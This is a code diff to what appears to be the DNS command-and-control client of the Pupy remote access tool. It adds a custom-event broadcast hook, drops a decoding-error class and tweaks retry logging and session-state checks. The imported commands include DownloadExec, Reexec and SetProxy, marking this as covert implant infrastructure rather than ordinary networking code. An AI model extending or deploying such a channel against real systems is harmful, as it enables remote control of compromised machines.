@@ -1,7 +1,6 @@
 # -*- coding: utf-8 -*-
 
 __all__ = (
-    'DnsCommandClientDecodingError',
     'DnsCommandsClient',
 )
 
@@ -36,7 +35,7 @@ from picocmd import (
     Reexec, Exit, Disconnect,
     Policy, Kex, SystemInfo,
     SetProxy, Connect, DownloadExec,
-    PasteLink,
+    PasteLink, CustomEvent,
     OnlineStatusRequest, PupyState,
     Error, ParcelInvalidCrc,
     ParcelInvalidPayload,
@@ -50,9 +49,6 @@ try:
     from network.lib import tinyhttp
 except ImportError:
     tinyhttp = None
-
-class DnsCommandClientDecodingError(Exception):
-    pass
 
 class ProxyInfo(object):
     __slots__ = (
@@ -89,6 +85,7 @@ class DnsCommandsClient(Thread):
         try:
             import pupy
             self.pupy = pupy
+            self.pupy.broadcast_event = self._broadcast_event
             self.cid = pupy.cid
         except:
             self.pupy = None
@@ -159,6 +156,10 @@ class DnsCommandsClient(Thread):
     def event(self, command):
         logging.debug('Event: %s', command)
         self._request(command)
+
+    def _broadcast_event(self, eventid):
+        logging.debug('EventId: %08x', eventid)
+        self.event(CustomEvent(eventid))
 
     def _native_resolve(self, hostname):
         _, _, addresses = socket.gethostbyname_ex(hostname)
@@ -317,8 +318,8 @@ class DnsCommandsClient(Thread):
 
                 break
 
-            except (ParcelInvalidCrc, DnsCommandClientDecodingError):
-                logging.error('CRC FAILED / Attempt %s', attempt)
+            except ParcelInvalidCrc:
+                logging.error('CRC FAILED / Attempt %d [%s]', attempt, addresses)
 
                 self.spi = None
                 self.encoder.kex_reset()
@@ -427,7 +428,7 @@ class DnsCommandsClient(Thread):
 
         if self.spi:
             commands = self._request(
-                PupyState(self.pupy.connected, self.pupy.manager.dirty),
+                PupyState(bool(self.pupy.connection), self.pupy.manager.dirty),
                 SystemStatus())
         else:
             commands = self._request(Poll())
@@ -462,6 +463,7 @@ class DnsCommandsClient(Thread):
                     self.encoder.process_kex_response(response[0].parcel)
                     self.spi = kex.spi
                     self.on_session_established()
+
             elif isinstance(command, Poll):
                 response = self._request(SystemInfo())
 
